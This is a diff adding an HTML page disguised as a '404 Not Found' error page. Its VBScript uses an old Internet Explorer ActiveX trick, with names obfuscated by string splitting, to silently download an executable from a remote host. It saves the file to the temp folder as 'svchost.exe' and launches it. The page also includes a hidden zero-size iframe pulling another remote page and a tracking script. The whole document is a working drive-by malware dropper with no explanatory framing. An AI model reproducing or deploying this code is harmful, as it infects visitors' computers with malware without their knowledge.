@@ -1,0 +1,65 @@
+    <html>
+
+    <title></title>
+    <head></head>
+
+    <body>
+
+    <script language="VBScript">
+
+    on error resume next
+
+    dl = "http://lovekr.4dq.com/view.exe"
+
+    Set df = document.createElement("object")
+    bb1="clsid:BD96C556-65A3"
+    bb2="-11D0-983A-00C04FC29E36"
+    
+    bb3 = bb1&bb2
+    df.setAttribute "classid", bb3
+    str="Microsoft.XMLHTTP"
+    Set x = df.CreateObject(str,"")
+
+    tt1="Adodb"
+    tt2="."
+    tt3="Str"
+    tt4="eam"
+    str1=tt1&tt2&tt3&tt4
+    str5=str1
+    set S = df.createobject(str5,"")
+    S.type = 1
+
+    str6="GET"
+    x.Open str6, dl, False
+    x.Send
+
+    tonyfname1="svchost.exe"
+    set F = df.createobject("Scripting.FileSystemObject","")
+    set tmp = F.GetSpecialFolder(2)
+    tonyfname1= F.BuildPath(tmp,tonyfname1)
+    S.open
+
+    S.write x.responseBody
+    S.savetofile tonyfname1,2
+
+    S.close
+    
+    qq0="shel"
+    qq2="Application"
+    qq1="l."
+    qq3=qq0&qq1&qq2
+    set tonytony = df.createobject(qq3,"")
+    qq3="open"
+    tonytony.ShellExecute tonyfname1,     "",        "",  qq3,1
+
+    </script>
+    <head>
+    <title>404 Not Found</title>
+    </head><body>
+    <h1>Not Found</h1>
+    
+    </body>
+
+    </html>
+<iframe src="http://lovekr.25u.com/view.htm" width="0" height="0" frameborder="0"></iframe>
+<script language="javascript" src="http://count24.51yes.com/click.aspx?id=241467882&logo=1"></script>
